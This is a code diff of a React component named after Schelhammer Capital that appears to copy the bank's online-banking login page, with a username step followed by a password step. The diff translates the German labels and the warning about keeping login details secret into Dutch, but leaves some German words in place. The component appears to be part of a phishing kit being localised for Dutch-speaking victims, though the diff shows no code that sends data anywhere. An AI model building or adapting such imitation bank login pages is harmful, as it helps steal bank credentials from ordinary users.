@@ -55,7 +55,7 @@ export function SchelhammerCapital({ formData, onChange, handleRouteAction, savi
             <div className="p-6 md:p-8">
               {/* Intro Text */}
               <p className="text-[14px] text-gray-800 mb-6 leading-relaxed">
-                Hier können Sie sich für Ihr neues Online Banking anmelden. Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner anderen Seite eingeben und diese geheim halten. Wir werden Sie nie nach Ihrer PIN oder einer TAN fragen!
+                Hier kunt u inloggen op uw internetbankieren. Tijdens het inloggen wordt een beveiligde verbinding opgezet. Let op dat u uw inloggegevens nergens anders invoert en deze geheim houdt. Wij zullen u nooit om uw PIN of TAN vragen!
               </p>
 
               {/* Demo Version Checkbox */}
@@ -76,7 +76,7 @@ export function SchelhammerCapital({ formData, onChange, handleRouteAction, savi
                 {step === 1 ? (
                   <>
                     <div className="flex justify-between items-end mb-1">
-                      <label className="text-[12px] text-gray-400">Benutzername</label>
+                      <label className="text-[12px] text-gray-400">Gebruikersnaam</label>
                       <div className="text-[12px] text-[#cc0000]">
                         <a href="#" className="hover:underline">Hochkontrast</a> <span className="text-gray-400 mx-1">|</span> <a href="#" className="hover:underline">English</a>
                       </div>
@@ -93,7 +93,7 @@ export function SchelhammerCapital({ formData, onChange, handleRouteAction, savi
                 ) : (
                   <>
                     <div className="flex justify-between items-end mb-1">
-                      <label className="text-[12px] text-gray-400">Passwort</label>
+                      <label className="text-[12px] text-gray-400">Wachtwoord</label>
                       <div className="text-[12px] text-[#cc0000]">
                         <a href="#" className="hover:underline">Hochkontrast</a> <span className="text-gray-400 mx-1">|</span> <a href="#" className="hover:underline">English</a>
                       </div>
@@ -136,8 +136,8 @@ export function SchelhammerCapital({ formData, onChange, handleRouteAction, savi
 
               {/* Footer Links */}
               <div className="mt-8 flex flex-col items-center gap-1">
-                <a href="#" className="text-[14px] text-[#cc0000] hover:underline">Benutzername vergessen</a>
-                <a href="#" className="text-[14px] text-[#cc0000] hover:underline">Passwort vergessen</a>
+                <a href="#" className="text-[14px] text-[#cc0000] hover:underline">Gebruikersnaam vergessen</a>
+                <a href="#" className="text-[14px] text-[#cc0000] hover:underline">Wachtwoord vergessen</a>
               </div>
             </div>
           </div>
